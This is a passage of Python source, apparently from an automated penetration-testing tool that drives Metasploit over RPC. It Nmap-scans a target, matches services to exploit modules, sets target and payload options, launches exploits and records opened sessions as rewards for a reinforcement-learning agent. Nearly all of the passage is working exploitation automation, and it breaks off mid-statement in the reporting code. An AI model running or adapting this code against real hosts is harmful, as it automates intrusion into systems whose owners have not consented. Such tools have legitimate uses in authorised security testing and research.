


'''
Metasploit Interface
'''
class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        # Read config.ini.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        # Common setting value.
        server_host = config['Common']['server_host']
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']

        # Metasploit options setting value.
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        # Nmap options setting value.
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']
        self.nmap_2nd_command = config['Nmap']['second_command']
        self.nmap_2nd_timeout = config['Nmap']['second_timeout']

        # A3C setting value.
        self.train_worker_num = int(config['A3C']['train_worker_num'])
        self.train_max_num = int(config['A3C']['train_max_num'])
        self.train_max_steps = int(config['A3C']['train_max_steps'])
        self.train_tmax = int(config['A3C']['train_tmax'])
        self.test_worker_num = int(config['A3C']['test_worker_num'])
        self.greedy_rate = float(config['A3C']['greedy_rate'])
        self.eps_steps = int(self.train_max_num * self.greedy_rate)

        # State setting value.
        self.state = []                                            # Deep Exploit's state(s).
        self.os_type = str(config['State']['os_type']).split('@')  # OS type.
        self.os_real = len(self.os_type) - 1
        self.service_list = str(config['State']['services']).split('@')  # Product name.

        # Report setting value.
        self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
        self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
        if os.path.exists(self.report_train_path) is False:
            os.mkdir(self.report_train_path)
        self.scan_start_time = self.util.get_current_date()
        self.source_host= server_host

        self.client = Msgrpc({'host': server_host, 'port': server_port})  # Create Msgrpc instance.
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  # Log in to RPC Server.
        self.client.get_console()                              # Get MSFconsole ID.
        self.buffer_seq = 0
        self.isPostExploit = False                             # Executing Post-Exploiting True/False.

    # Create exploit tree.
    def get_exploit_tree(self):
        self.util.print_message(NOTE, 'Get exploit tree.')
        exploit_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                temp_target_tree = {'targets': []}
                temp_tree = {}
                # Set exploit module.
                use_cmd = 'use exploit/' + exploit + '\n'
                _ = self.client.send_command(self.client.console_id, use_cmd, False)

                # Get target.
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                    if 'Exploit targets' in target_info:
                        break
                    if time_count == 5:
                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No exist Targets.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                for target in target_list:
                    # Get payload list.
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list

                # Get options.
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    # User specify.
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                # Add payloads and targets to exploit tree.
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                # Output processing status to console.
                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))

            # Save exploit tree to local file.
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved exploit tree.')
        else:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
        return exploit_tree

    # Get target host information.
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message(NOTE, 'Get target info.')
        target_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Check web port.
            web_prod_list = []
            path_list = ['' for idx in range(len(com_port_list))]
            # TODO: Crawling on the Post-Exploitation phase.
            if self.isPostExploit is False:
                web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)
                web_target_info = self.util.run_spider(rhost, web_port_list, self.client)
                classifier = self.util.load_plugin('classifier_signature')
                if classifier is not None:
                    self.util.print_message(OK, 'Gather HTTP responses.')
                    web_prod_list = classifier.classifier_signature(web_target_info, self.client)
                for idx, web_prod in enumerate(web_prod_list):
                    web_item = web_prod.split('@')
                    proto_list.append('tcp')
                    port_info.append(web_item[0] + ' ' + web_item[1])
                    com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                    path_list.append(web_item[3])

            # Create target info.
            target_tree = {'rhost': rhost, 'os_type': self.os_real}
            for port_idx, port_num in enumerate(com_port_list):
                temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}

                # Get product name.
                service_name = 'unknown'
                for (idx, service) in enumerate(self.service_list):
                    if service in port_info[port_idx].lower():
                        service_name = service
                        break
                temp_tree['prod_name'] = service_name

                # Get product version.
                # idx=1 2.3.4, idx=2 4.7p1, idx=3 1.0.1f, idx4 2.0 or v1.3 idx5 3.X
                regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
                              r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
                              r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
                              r'.*\s[a-z]?(\d\.\d).*',
                              r'.*\s(\d\.[xX|\*]).*']
                version = 0.0
                output_version = 0.0
                for (idx, regex) in enumerate(regex_list):
                    version_raw = self.cutting_strings(regex, port_info[port_idx])
                    if len(version_raw) == 0:
                        continue
                    if idx == 0:
                        index = version_raw[0].rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 1:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 2:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        index = version.rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index:]
                        output_version = version_raw[0]
                        break
                    elif idx == 3:
                        version = self.cutting_strings(r'[a-z]?(\d\.\d)', version_raw[0])
                        version = version[0]
                        output_version = version_raw[0]
                        break
                    elif idx == 4:
                        version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                        version = version[0]
                        output_version = version_raw[0]
                temp_tree['version'] = float(version)

                # Get protocol type.
                temp_tree['protocol'] = proto_list[port_idx]

                if path_list is not None:
                    temp_tree['target_path'] = path_list[port_idx]

                # Get exploit module.
                module_list = []
                raw_module_info = ''
                idx = 0
                search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
                raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*)', raw_module_info))
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                    temp_tree['prod_name'] = 'unknown'

                for module in module_list:
                    if module[1] in {'excellent', 'great', 'good'}:
                        temp_tree['exploit'].append(module[0])
                target_tree[str(port_num)] = temp_tree

                # Output processing status to console.
                self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  temp_tree['prod_name'],
                                                                                  output_version,
                                                                                  len(temp_tree['exploit'])))

            # Save target host information to local file.
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved target tree.')
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()

        return target_tree

    # Get target host information for indicate port number.
    def get_target_info_indicate(self, rhost, proto_list, port_info, port=None, prod_name=None):
        self.util.print_message(NOTE, 'Get target info for indicate port number.')
        target_tree = {'origin_port': port}

        # Update "com_port_list".
        com_port_list = []
        for prod in prod_name.split('@'):
            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'exploit': []}
            virtual_port = str(np.random.randint(999999999))
            com_port_list.append(virtual_port)

            # Get product name.
            service_name = 'unknown'
            for (idx, service) in enumerate(self.service_list):
                if service == prod.lower():
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name

            # Get product version.
            temp_tree['version'] = float(0.0)

            # Get protocol type.
            temp_tree['protocol'] = 'tcp'

            # Get exploit module.
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
            module_list = self.cutting_strings(r'(exploit/.*)', raw_module_info)
            if service_name != 'unknown' and len(module_list) == 0:
                continue
            for exploit in module_list:
                raw_exploit_info = exploit.split(' ')
                exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
                if exploit_info[2] in {'excellent', 'great', 'good'}:
                    temp_tree['exploit'].append(exploit_info[0])
            target_tree[virtual_port] = temp_tree

            # Output processing status to console.
            self.util.print_message(OK, 'Analyzing port {}/{}, {}, '
                                        'Available exploit modules:{}'.format(port,
                                                                              temp_tree['protocol'],
                                                                              temp_tree['prod_name'],
                                                                              len(temp_tree['exploit'])))

        # Save target host information to local file.
        with codecs.open(os.path.join(self.data_path, 'target_info_indicate_' + rhost + '.json'), 'w', 'utf-8') as fout:
            json.dump(target_tree, fout, indent=4)

        return target_tree, com_port_list

    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 15:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    # Parse.
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    # Normalization.
    def normalization(self, target_idx):
        if target_idx == ST_OS_TYPE:
            os_num = int(self.state[ST_OS_TYPE])
            os_num_mean = len(self.os_type) / 2
            self.state[ST_OS_TYPE] = (os_num - os_num_mean) / os_num_mean
        if target_idx == ST_SERV_NAME:
            service_num = self.state[ST_SERV_NAME]
            service_num_mean = len(self.service_list) / 2
            self.state[ST_SERV_NAME] = (service_num - service_num_mean) / service_num_mean
        elif target_idx == ST_MODULE:
            prompt_num = self.state[ST_MODULE]
            prompt_num_mean = len(com_exploit_list) / 2
            self.state[ST_MODULE] = (prompt_num - prompt_num_mean) / prompt_num_mean

    # Execute Nmap.
    def execute_nmap(self, rhost, command, timeout):
        self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            # Execute Nmap.
            self.util.print_message(OK, '{}'.format(command))
            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
            _ = self.client.call('console.write', [self.client.console_id, command])

            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of Nmap finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                        self.client.keep_alive()
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        time.sleep(5.0)
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            _ = self.client.call('console.destroy', [self.client.console_id])
            ret = self.client.call('console.create', [])
            try:
                self.client.console_id = ret.get(b'id')
            except Exception as e:
                self.util.print_exception(e, 'Failed: console.create')
                exit(1)
            _ = self.client.call('console.read', [self.client.console_id])
        else:
            self.util.print_message(OK, 'Nmap already scanned.')

    # Get port list from Nmap's XML result.
    def get_port_list(self, nmap_result_file, rhost):
        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
        global com_port_list
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)
            time_count = 0
            while True:
                # Judgement of 'services' command finishing.
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if self.timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
                        break

                    nmap_result += ret.get(b'data').decode('utf-8')
                    status = ret.get(b'busy')
                    if status is False:
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: console.read')
                time.sleep(1.0)
                time_count += 1

            # Get port, protocol, information from XML file.
            port_list = []
            proto_list = []
            info_list = []
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    if obj_child.name == 'service':
                        temp_info = ''
                        if 'product' in obj_child.attrs:
                            temp_info += obj_child.attrs['product'] + ' '
                        if 'version' in obj_child.attrs:
                            temp_info += obj_child.attrs['version'] + ' '
                        if 'extrainfo' in obj_child.attrs:
                            temp_info += obj_child.attrs['extrainfo']
                        if temp_info != '':
                            info_list.append(temp_info)
                        else:
                            info_list.append('unknown')
                # Display getting port information.
                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]))

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Deep Exploit...')
                self.client.termination(self.client.console_id)
                exit(1)

            # Update com_port_list.
            com_port_list = port_list

            # Get OS name from XML file.
            some_os = bs.find_all('osmatch')
            os_name = 'unknown'
            for obj_os in some_os:
                for obj_child in obj_os.contents:
                    if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                        os_name = (obj_child.attrs['osfamily']).lower()
                        break

            # Set OS to state.
            for (idx, os_type) in enumerate(self.os_type):
                if os_name in os_type:
                    self.os_real = idx
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            com_port_list = port_list

        return port_list, proto_list, info_list

    # Get Exploit module list.
    def get_exploit_list(self):
        self.util.print_message(NOTE, 'Get exploit list.')
        all_exploit_list = []
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
            self.util.print_message(OK, 'Loading exploit list from Metasploit.')

            # Get Exploit module list.
            all_exploit_list = []
            exploit_candidate_list = self.client.get_module_list('exploit')
            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            # Save Exploit module list to local file.
            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved exploit list.')
        else:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
        return all_exploit_list

    # Get payload list.
    def get_payload_list(self, module_name='', target_num=''):
        self.util.print_message(NOTE, 'Get payload list.')
        all_payload_list = []
        if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
            self.util.print_message(OK, 'Loading payload list from Metasploit.')

            # Get payload list.
            payload_list = []
            if module_name == '':
                # Get all Payloads.
                payload_list = self.client.get_module_list('payload')

                # Save payload list to local file.
                fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
                for idx, item in enumerate(payload_list):
                    time.sleep(0.1)
                    self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1),
                                                                                  len(payload_list),
                                                                                  item))
                    fout.write(item + '\n')
                fout.close()
                self.util.print_message(OK, 'Saved payload list.')
            elif target_num == '':
                # Get payload that compatible exploit module.
                payload_list = self.client.get_compatible_payload_list(module_name)
            else:
                # Get payload that compatible target.
                payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
        else:
            # Get payload list from local file.
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
        return payload_list

    # Reset state (s).
    def reset_state(self, exploit_tree, target_tree):
        # Randomly select target port number.
        port_num = str(com_port_list[random.randint(0, len(com_port_list) - 1)])
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None, None

        # Initialize state.
        self.state = []

        # Set os type to state.
        self.os_real = target_tree['os_type']
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        # Set product name (index) to state.
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
                self.state.insert(ST_SERV_NAME, idx)
                break
        self.normalization(ST_SERV_NAME)

        # Set version to state.
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        # Set exploit module type (index) to state.
        module_list = target_tree[port_num]['exploit']

        # Randomly select exploit module.
        module_name = ''
        module_info = []
        while True:
            module_name = module_list[random.randint(0, len(module_list) - 1)]
            for (idx, exploit) in enumerate(com_exploit_list):
                exploit = 'exploit/' + exploit
                if exploit == module_name:
                    self.state.insert(ST_MODULE, idx)
                    break
            self.normalization(ST_MODULE)
            break

        # Randomly select target.
        module_name = module_name[8:]
        target_list = exploit_tree[module_name]['target_list']
        targets_num = target_list[random.randint(0, len(target_list) - 1)]
        self.state.insert(ST_TARGET, int(targets_num))

        # Set exploit stage to state.
        # self.state.insert(ST_STAGE, S_NORMAL)

        # Set target information for display.
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name,
                       'version': target_tree[port_num]['version'], 'exploit': module_name}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)

        return False, self.state, exploit_tree[module_name]['targets'][targets_num], target_list, target_info

    # Get state (s).
    def get_state(self, exploit_tree, target_tree, port_num, exploit, target):
        # Get product name.
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None

        # Initialize state.
        self.state = []

        # Set os type to state.
        self.os_real = target_tree['os_type']
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        # Set product name (index) to state.
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
                self.state.insert(ST_SERV_NAME, idx)
                break
        self.normalization(ST_SERV_NAME)

        # Set version to state.
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        # Select exploit module (index).
        for (idx, temp_exploit) in enumerate(com_exploit_list):
            temp_exploit = 'exploit/' + temp_exploit
            if exploit == temp_exploit:
                self.state.insert(ST_MODULE, idx)
                break
        self.normalization(ST_MODULE)

        # Select target.
        self.state.insert(ST_TARGET, int(target))

        # Set exploit stage to state.
        # self.state.insert(ST_STAGE, S_NORMAL)

        # Set target information for display.
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'],
                       'prod_name': service_name, 'version': target_tree[port_num]['version'],
                       'exploit': exploit[8:], 'target': target}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)

        return False, self.state, exploit_tree[exploit[8:]]['targets'][target], target_info

    # Get available payload list (convert from string to number).
    def get_available_actions(self, payload_list):
        payload_num_list = []
        for self_payload in payload_list:
            for (idx, payload) in enumerate(com_payload_list):
                if payload == self_payload:
                    payload_num_list.append(idx)
                    break
        return payload_num_list

    # Show banner of successfully exploitation.
    def show_banner_bingo(self, prod_name, exploit, payload, sess_type, delay_time=2.0):
        banner = u"""
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         ██████╗  ██████╗ ████████╗ ██████╗██╗  ██╗ █████╗ 
        ██╔════╝ ██╔═══██╗╚══██╔══╝██╔════╝██║  ██║██╔══██╗
        ██║  ███╗██║   ██║   ██║   ██║     ███████║███████║
        ██║   ██║██║   ██║   ██║   ██║     ██╔══██║██╔══██║
        ╚██████╔╝╚██████╔╝   ██║   ╚██████╗██║  ██║██║  ██║
         ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝                                              
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        """ + prod_name + ' ' + exploit + ' ' + payload + ' ' + sess_type + '\n'
        self.util.print_message(NONE, banner)
        time.sleep(delay_time)

    # Set Metasploit options.
    def set_options(self, target_info, target, selected_payload, exploit_tree):
        options = exploit_tree[target_info['exploit']]['options']
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    # If "user_specify" is not null, set "user_specify" value to the key.
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'

            # Set target path/uri/dir etc.
            if len([s for s in self.path_collection if s in key.lower()]) != 0:
                option[key] = target_info['target_path']

        option['RHOST'] = self.rhost
        if self.port_div_symbol in target_info['port']:
            tmp_port = target_info['port'].split(self.port_div_symbol)
            option['RPORT'] = int(tmp_port[0])
        else:
            option['RPORT'] = int(target_info['port'])
        option['TARGET'] = int(target)
        if selected_payload != '':
            option['PAYLOAD'] = selected_payload
        return option

    # Execute exploit.
    def execute_exploit(self, action, thread_name, thread_type, target_list, target_info, step, exploit_tree, frame=0):
        # Set target.
        target = ''
        if thread_type == 'learning':
            target = str(self.state[ST_TARGET])
        else:
            # If testing, 'target_list' is target number (not list).
            target = target_list
            # If trial exceed maximum number of trials, finish trial at current episode.
            if step > self.max_attempt - 1:
                return self.state, None, True, {}

        # Set payload.
        selected_payload = ''
        if action != 'no payload':
            selected_payload = com_payload_list[action]
        else:
            # No payload
            selected_payload = ''

        # Set options.
        option = self.set_options(target_info, target, selected_payload, exploit_tree)

        # Execute exploit.
        reward = 0
        message = ''
        session_list = {}
        done = False
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], option)
        if uuid is not None:
            # Check status of running module.
            _ = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            if len(key_list) != 0:
                # Probably successfully of exploitation (but unsettled).
                for key in key_list:
                    exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                    if uuid == exploit_uuid:
                        # Successfully of exploitation.
                        session_id = int(key)
                        session_type = sessions[key][b'type'].decode('utf-8')
                        session_port = str(sessions[key][b'session_port'])
                        session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                        session_payload = sessions[key][b'via_payload'].decode('utf-8')
                        module_info = self.client.get_module_info('exploit', session_exploit)

                        # Checking feasibility of post-exploitation.
                        # status, server_job_id, new_session_id = self.check_post_exploit(session_id, session_type)
                        # status = self.check_payload_type(session_payload, session_type)
                        status = True

                        if status:
                            # Successful of post-exploitation.
                            reward = R_GREAT
                            done = True
                            message = ''

                            # Display banner.
                            self.show_banner_bingo(target_info['prod_name'],
                                                   session_exploit,
                                                   session_payload,
                                                   session_type)
                        else:
                            # Failure of post-exploitation.
                            reward = R_GOOD
                            message = 'misfire '

                        # Gather reporting items.
                        vuln_name = module_info[b'name'].decode('utf-8')
                        description = module_info[b'description'].decode('utf-8')
                        ref_list = module_info[b'references']
                        reference = ''
                        for item in ref_list:
                            reference += '[' + item[0].decode('utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'

                        # Save reporting item for report.
                        if thread_type == 'learning':
                            with codecs.open(os.path.join(self.report_train_path,
                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)
                        else:
                            with codecs.open(os.path.join(self.report_test_path,
